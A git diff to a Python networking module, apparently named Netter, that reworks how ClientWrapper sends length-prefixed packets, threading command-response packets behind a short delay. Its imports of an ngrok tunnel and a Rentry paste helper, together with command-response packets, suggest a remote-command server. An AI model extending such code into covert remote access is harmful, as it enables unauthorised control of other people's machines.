@@ -1,15 +1,15 @@
 import socket, pyngrok
 import pyngrok.ngrok
 
-import hashlib, pickle
+import hashlib, pickle, threading
 from typing import Optional
+from time import sleep as _sleep
 
 from .rentry import Rentry
 from .enums import NetterClient, PacketType, ClientResponse
 from .handler import ClientHandler
 from .logger import Logging
 from .back_end import backEnd_server
-from .cache import ServerCache
 from .bucket import ConnectionBucket
 
 class ClientWrapper:
@@ -24,14 +24,24 @@ class ClientWrapper:
         if isinstance(data, str):
             data = data.encode("utf-8")
 
-        packet_length: int = len(data).to_bytes(4, "big")
-        packet_type: int = packetType.value.to_bytes(2, "little")
+        def run() -> None:
+            if (packetType == PacketType.COMMAND_RESPONSE):
+                _sleep(.1)
 
-        self.socket.send(packet_length)
-        self.socket.send(packet_type)
+            packet_length: int = len(data).to_bytes(4, "big")
+            packet_type: int = packetType.value.to_bytes(2, "little")
 
-        for chunk in range(0, len(data), self.BYTES_CHUNK):
-            self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])
+            self.socket.send(packet_length)
+            self.socket.send(packet_type)
+
+            for chunk in range(0, len(data), self.BYTES_CHUNK):
+                self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])
+
+        if (packetType == PacketType.COMMAND_RESPONSE):
+            threading.Thread(target = run).start()
+            return
+
+        run()
 
     def receive(self) -> ClientResponse:
         packetLength: int = int.from_bytes(self.socket.recv(4), "big")
@@ -64,9 +74,6 @@ class ClientWrapper:
             PacketType._value2member_map_.get(packet_type, PacketType.UNKNOWN),
             bytes(data)
         )
-
-    def on_incoming_packet(self, func: callable) -> None:
-        self.__waitingForResponse = func
 
 class NetterServer(Logging, ConnectionBucket):
     bindAddress: tuple[str, int] = None
